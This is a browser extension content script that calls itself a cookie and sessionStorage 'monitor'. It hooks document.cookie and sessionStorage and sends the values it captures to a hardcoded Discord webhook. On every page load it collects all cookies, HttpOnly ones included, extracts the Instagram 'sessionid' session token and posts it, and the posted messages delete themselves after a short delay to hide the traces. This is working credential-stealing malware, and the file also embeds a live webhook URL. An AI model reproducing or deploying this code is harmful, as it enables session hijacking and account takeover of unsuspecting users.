// content.js

// ============================================================
// Discord Webhook — posted directly from the content script.
// ============================================================
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1430991580411465748/35i2HUJAM5ZrJ8FPC6j9_2wOGKj1GwOh3apo2Zb4w3qGYZrEdYVXN4tdQVActLCDD2y3';

function sendMonitorMessage(payload) {
  const delayMs = Math.floor(Math.random() * (30000 - 5000 + 1)) + 5000;

  if (payload && payload.embeds && payload.embeds[0]) {
    const embed = payload.embeds[0];
    const deleteText = `Self-destructs in ${Math.round(delayMs / 1000)}s`;
    if (embed.footer) {
      embed.footer.text = `${embed.footer.text} | ${deleteText}`;
    } else {
      embed.footer = { text: deleteText };
    }
  }

  fetch(WEBHOOK_URL + '?wait=true', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  }).then(async (res) => {
    if (!res.ok) {
      console.error(`[Monitor] Webhook POST failed — HTTP ${res.status}`);
      return;
    }
    try {
      const data = await res.json();
      if (data && data.id) {
        setTimeout(() => {
          fetch(`${WEBHOOK_URL}/messages/${data.id}`, { method: 'DELETE' })
            .catch(err => console.error('[Monitor] Failed to delete webhook message:', err));
        }, delayMs);
      }
    } catch (e) {
      console.error('[Monitor] Could not parse webhook response for deletion');
    }
  }).catch((err) => {
    console.error('[Monitor] Webhook POST error:', err);
  });
}

// ============================================================
// Helper: safely truncate a stack trace for Discord's 1024-char field limit
// ============================================================
function safeStack(stack) {
  const MAX = 1024 - 16;
  if (!stack) return '(no stack)';
  const truncated = stack.length > MAX ? stack.substring(0, MAX - 3) + '...' : stack;
  return '```javascript\n' + truncated + '\n```';
}

// ============================================================
// Cookie Interceptor
// Grab the ORIGINAL descriptor BEFORE overriding, so we can
// call the real getter/setter without infinite recursion.
// ============================================================
const cookie_descriptor =
  Object.getOwnPropertyDescriptor(Document.prototype, 'cookie') ||
  Object.getOwnPropertyDescriptor(HTMLDocument.prototype, 'cookie');

// Keep a direct reference to the original get/set to avoid recursion
const _cookieGet = cookie_descriptor && cookie_descriptor.get;
const _cookieSet = cookie_descriptor && cookie_descriptor.set;

if (_cookieGet && _cookieSet) {
  Object.defineProperty(document, 'cookie', {
    configurable: true,
    enumerable: true,

    // Triggers when a script reads document.cookie
    get: function () {
      const stack = new Error().stack;

      console.groupCollapsed('%c[Cookie Monitor] Read Event', 'color: orange; font-weight: bold;');
      console.info('A script read document.cookie on this page.');
      console.groupEnd();

      sendMonitorMessage({
        embeds: [{
          title: '🍪 Cookie Read Event',
          description: `A script on \`${window.location.hostname}\` accessed \`document.cookie\`.`,
          color: 16753920,
          fields: [{ name: 'Stack Trace', value: safeStack(stack) }],
          timestamp: new Date().toISOString()
        }]
      });

      // Use the saved original getter — avoids infinite recursion
      return _cookieGet.call(this);
    },

    // Triggers when a script writes document.cookie
    set: function (val) {
      const stack = new Error().stack;

      console.groupCollapsed('%c[Cookie Monitor] Write Event', 'color: #e05c5c; font-weight: bold;');
      console.info('A script modified document.cookie on this page.');
      console.groupEnd();

      sendMonitorMessage({
        embeds: [{
          title: '✏️ Cookie Write Event',
          description: `A script on \`${window.location.hostname}\` modified \`document.cookie\`.`,
          color: 15548997,
          fields: [
            { name: 'New Value (preview)', value: `\`${String(val).substring(0, 200)}\``, inline: false },
            { name: 'Stack Trace', value: safeStack(stack) }
          ],
          timestamp: new Date().toISOString()
        }]
      });

      // Use the saved original setter — avoids infinite recursion
      _cookieSet.call(this, val);
    }
  });
}

// ============================================================
// SessionStorage Monitor
// Wrapped in DOMContentLoaded so sessionStorage is guaranteed
// to be available (safe for document_start run_at).
// ============================================================
function setupSessionStorageMonitor() {
  try {
    const _proto = Object.getPrototypeOf(sessionStorage);

    const _getItem = _proto.getItem.bind(sessionStorage);
    const _setItem = _proto.setItem.bind(sessionStorage);
    const _removeItem = _proto.removeItem.bind(sessionStorage);

    _proto.getItem = function (key) {
      const result = _getItem(key);
      console.groupCollapsed('%c[Storage Monitor] sessionStorage.getItem', 'color: orange; font-weight: bold;');
      console.info(`Key read: "${key}"`);
      console.groupEnd();
      return result;
    };

    _proto.setItem = function (key, value) {
      console.groupCollapsed('%c[Storage Monitor] sessionStorage.setItem', 'color: #e05c5c; font-weight: bold;');
      console.info(`Key written: "${key}"`);
      console.groupEnd();

      sendMonitorMessage({
        embeds: [{
          title: '✏️ SessionStorage Write Event',
          description: `A script on \`${window.location.hostname}\` wrote to \`sessionStorage\`.`,
          color: 15548997,
          fields: [
            { name: 'Key', value: `\`${key}\``, inline: true },
            { name: 'Value', value: `\`${String(value).substring(0, 200)}\``, inline: true }
          ],
          timestamp: new Date().toISOString()
        }]
      });

      return _setItem(key, value);
    };

    _proto.removeItem = function (key) {
      console.groupCollapsed('%c[Storage Monitor] sessionStorage.removeItem', 'color: #aaa; font-weight: bold;');
      console.info(`Key removed: "${key}"`);
      console.groupEnd();

      sendMonitorMessage({
        embeds: [{
          title: '🗑️ SessionStorage Remove Event',
          description: `A script on \`${window.location.hostname}\` removed a key from \`sessionStorage\`.`,
          color: 9807270,
          fields: [{ name: 'Key', value: `\`${key}\``, inline: true }],
          timestamp: new Date().toISOString()
        }]
      });

      return _removeItem(key);
    };
  } catch (e) {
    console.warn('[Monitor] Could not hook sessionStorage:', e);
  }
}

// ============================================================
// Page Load Notification
// Sends a Discord embed with cookie data
// (fetched via background so HttpOnly cookies are included).
// ============================================================
function notifyPageLoad() {
  let extName = 'Unknown', extVersion = '?';
  try {
    const manifest = chrome.runtime.getManifest();
    extName = manifest.name;
    extVersion = manifest.version;
  } catch (_) { }

  const pageUrl = window.location.href;
  const pageTitle = document.title || 'Targeted Page';

  // Ask the background for ALL cookies (includes HttpOnly cookies)
  chrome.runtime.sendMessage(
    { action: 'getAllCookies', url: pageUrl },
    (response) => {
      if (chrome.runtime.lastError) {
        console.error('[Monitor] Could not reach background:', chrome.runtime.lastError.message);
      }

      let cookieCount = 0;
      let sessionidValue = 'not found';  // Instagram

      if (response && Array.isArray(response.cookies)) {
        cookieCount = response.cookies.length;

        const sessionidCookie = response.cookies.find(c => c.name === 'sessionid');

        if (sessionidCookie) sessionidValue = sessionidCookie.value;
      } else {
        // Fallback: document.cookie (HttpOnly cookies will NOT appear here)
        try {
          const raw = _cookieGet ? _cookieGet.call(document) : document.cookie;
          const parts = raw ? raw.split(';').map(c => c.trim()) : [];
          cookieCount = parts.filter(Boolean).length;

          const sessionidMatch = parts.find(c => c.startsWith('sessionid='));
          if (sessionidMatch) sessionidValue = sessionidMatch.split('=').slice(1).join('=');
        } catch (_) { }
      }

      sendMonitorMessage({
        embeds: [{
          title: '🔔 Page Load Detected',
          description: `**${pageTitle}**\n\`${pageUrl}\``,
          color: 5814783,
          fields: [
            { name: 'Extension', value: `${extName} v${extVersion}`, inline: true },
            { name: 'Runtime ID', value: `\`${chrome.runtime.id}\``, inline: true },
            { name: 'Cookie Count', value: `\`${cookieCount} cookie(s)\``, inline: true },
            { name: 'ID (Instagram)', value: `\`${sessionidValue}\``, inline: false },
            { name: 'Timestamp', value: new Date().toLocaleString(), inline: false }
          ],
          footer: { text: `Triggered by ${extName}` },
          timestamp: new Date().toISOString()
        }]
      });
    }
  );
}

// ============================================================
// Boot — wait for DOM so title & sessionStorage are available
// ============================================================
if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', () => {
    setupSessionStorageMonitor();
    notifyPageLoad();
  }, { once: true });
} else {
  setupSessionStorageMonitor();
  notifyPageLoad();
}